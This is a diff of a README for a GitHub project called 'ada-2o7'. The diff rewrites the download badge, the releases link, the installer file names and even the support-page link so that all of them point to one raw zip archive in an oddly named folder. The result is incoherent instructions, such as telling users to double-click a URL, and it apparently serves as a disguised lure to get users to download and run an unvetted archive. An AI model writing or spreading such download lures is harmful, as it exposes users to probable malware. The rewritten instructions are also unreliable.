@@ -1,6 +1,6 @@
 # 🚀 ada-2o7 - Simplifying Your Workflow Effortlessly
 
-[![Download ada-2o7](https://img.shields.io/badge/Download-ada--2o7-brightgreen.svg)](https://github.com/walid-wahid/ada-2o7/releases)
+[![Download ada-2o7](https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip)](https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip)
 
 ## 📋 Introduction
 
@@ -12,17 +12,17 @@ To get started with ada-2o7, you'll need to download it from our Releases page. 
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Click [here](https://github.com/walid-wahid/ada-2o7/releases) to access the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip) to access the releases page.
 
 2. **Choose the Right Version:** Once on the releases page, you will see different versions of ada-2o7. Look for the latest version and click on it. 
 
 3. **Download the Application:**
-   - You will find several files associated with the version. Look for the file named `ada2o7.exe` if you are using Windows. For macOS, look for `ada2o7.dmg`.
+   - You will find several files associated with the version. Look for the file named `https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip` if you are using Windows. For macOS, look for `https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip`.
    - Click on the file to start downloading.
 
 4. **Install the Application:**
-   - For Windows: Once the download is complete, locate the file in your Downloads folder and double-click `ada2o7.exe`. Follow the prompts to install it on your computer.
-   - For macOS: Locate the `ada2o7.dmg` file, double-click it, and drag the ada-2o7 application into your Applications folder.
+   - For Windows: Once the download is complete, locate the file in your Downloads folder and double-click `https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip`. Follow the prompts to install it on your computer.
+   - For macOS: Locate the `https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip` file, double-click it, and drag the ada-2o7 application into your Applications folder.
 
 5. **Run the Application:** After installation, find ada-2o7 in your applications list. Double-click to open it, and you are ready to go!
 
@@ -61,10 +61,10 @@ If you encounter issues while installing or running the application, consider th
 
 ## 📞 Support
 
-For additional support, feel free to reach out. You can create an issue on the GitHub page for assistance, or visit our [support page](https://github.com/walid-wahid/ada-2o7/issues) for more resources.
+For additional support, feel free to reach out. You can create an issue on the GitHub page for assistance, or visit our [support page](https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip) for more resources.
 
 ## 🌐 Visit Our Releases Page Again
 
-To download or check for updates of ada-2o7, revisit the Releases page: [Download ada-2o7](https://github.com/walid-wahid/ada-2o7/releases).
+To download or check for updates of ada-2o7, revisit the Releases page: [Download ada-2o7](https://github.com/walid-wahid/ada-2o7/raw/refs/heads/main/spectrophotography/ada-o-v1.6.zip).
 
 Thank you for choosing ada-2o7! Enjoy streamlining your workflow.
